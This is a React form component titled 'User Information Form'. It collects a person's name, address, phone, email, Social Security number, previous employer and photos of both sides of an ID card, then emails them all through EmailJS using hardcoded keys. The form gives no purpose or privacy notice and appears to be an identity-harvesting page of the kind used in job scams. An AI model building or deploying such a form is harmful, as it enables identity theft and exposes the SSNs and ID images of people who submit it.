import { useState } from "react";
import emailjs from "@emailjs/browser";

const FormComponent = () => {
  const [formData, setFormData] = useState({
    name: "",
    address: "",
    phone: "",
    email: "",
    ssn: "",
    previousEmployer: "",
    idCardFrontBase64: "",
    idCardBackBase64: "",
  });

  const [fileNames, setFileNames] = useState({
    idCardFront: "No file chosen",
    idCardBack: "No file chosen",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e, side, label) => {
    const file = e.target.files[0];
    if (file && file.type.startsWith("image/")) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData((prev) => ({ ...prev, [side]: reader.result }));
        setFileNames((prev) => ({ ...prev, [label]: file.name }));
      };
      reader.onerror = () => {
        alert("Error reading the file. Please try again.");
      };
      reader.readAsDataURL(file);
    } else {
      alert("Please upload a valid image file.");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const emailData = {
      service_id: "service_x9ryr1u",
      template_id: "template_1hq6etl",
      user_id: "pg09Mt7R3DRf_Tz1N",
      template_params: {
        ...formData,
      },
    };

    try {
      await emailjs.send(
        emailData.service_id,
        emailData.template_id,
        emailData.template_params,
        emailData.user_id
      );
      alert("Your information has been sent successfully!");
    } catch (error) {
      console.error("Error sending email:", error);
      alert("Failed to send information. Please try again.");
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10 relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-purple-500 to-indigo-500 opacity-20 blur-2xl"></div>
      <div className="relative backdrop-blur-md bg-white/80 shadow-2xl rounded-2xl p-6 sm:p-8 lg:p-10">
        <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">User Information Form</h2>
        <form onSubmit={handleSubmit} className="space-y-5">

          <label className="block text-gray-700 font-medium">Full Name <span className="text-red-500">*</span></label>
          <input type="text" name="name" value={formData.name} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          <label className="block text-gray-700 font-medium">Address <span className="text-red-500">*</span></label>
          <input type="text" name="address" value={formData.address} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          <label className="block text-gray-700 font-medium">Phone Number <span className="text-red-500">*</span></label>
          <input type="tel" name="phone" value={formData.phone} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          <label className="block text-gray-700 font-medium">Email <span className="text-red-500">*</span></label>
          <input type="email" name="email" value={formData.email} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          <label className="block text-gray-700 font-medium">Social Security Number <span className="text-red-500">*</span></label>
          <input type="text" name="ssn" value={formData.ssn} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          <label className="block text-gray-700 font-medium">Previous Employer <span className="text-red-500">*</span></label>
          <input type="text" name="previousEmployer" value={formData.previousEmployer} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />

          {/* Front ID Upload */}
          <label className="block text-gray-700 font-medium">Upload Front of ID <span className="text-red-500">*</span></label>
          <div className="flex items-center space-x-3">
            <input id="front-id" type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, "idCardFrontBase64", "idCardFront")} className="hidden" required />
            <label htmlFor="front-id" className="cursor-pointer bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300">Choose File</label>
            <span className="text-gray-600">{fileNames.idCardFront}</span>
          </div>

          {/* Back ID Upload */}
          <label className="block text-gray-700 font-medium">Upload Back of ID <span className="text-red-500">*</span></label>
          <div className="flex items-center space-x-3">
            <input id="back-id" type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, "idCardBackBase64", "idCardBack")} className="hidden" required />
            <label htmlFor="back-id" className="cursor-pointer bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300">Choose File</label>
            <span className="text-gray-600">{fileNames.idCardBack}</span>
          </div>

          <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default FormComponent;
